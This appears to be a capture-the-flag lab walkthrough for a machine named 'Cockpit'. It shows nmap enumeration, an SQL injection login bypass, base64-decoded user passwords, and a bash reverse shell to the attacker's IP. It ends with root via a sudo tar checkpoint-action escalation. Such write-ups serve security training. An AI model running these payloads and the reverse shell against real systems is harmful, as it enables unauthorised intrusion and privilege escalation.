##### Tags: `sqli`  `sudo-l`  `webenum`  `GTFOBin`

# 🐧Cockpit🐧
## Enumeration
Nmap
```
$ nmap -sC -sV 192.168.139.10 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 15:55 AEDT
Nmap scan report for 192.168.139.10
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.139.10:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 and 9090 are both login page    
tried the default credential not working    
then try sql injection    
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
```
confirmed is vulnerable to sql    
use sql login bypass  
```
admin' #
```
successfully logged in    
got two users and passwords  
```
james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```
use base64 decode and got two password  
```
canttouchhhthiss@455152
thisscanttbetouchedd@455152
```
login with port 9090 with james credential   
it is running Ubuntu  
get a reverse shell in the terminal  
```
bash -i >& /dev/tcp/192.168.45.178/9090 0>&1

$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.139.10] 60622
james@blaze:~$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
```
## Privilege Escalation  

run sudo -l and found we can run tar as root without passwd
```
james@blaze:~$ sudo -l
sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
From the GTFObin we can find a exploit for running Tar command  
https://gtfobins.org/gtfobins/tar/#shell
```
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
we will change the file path to match the command
```
$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec="/bin/sh"
```
and we got root after
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
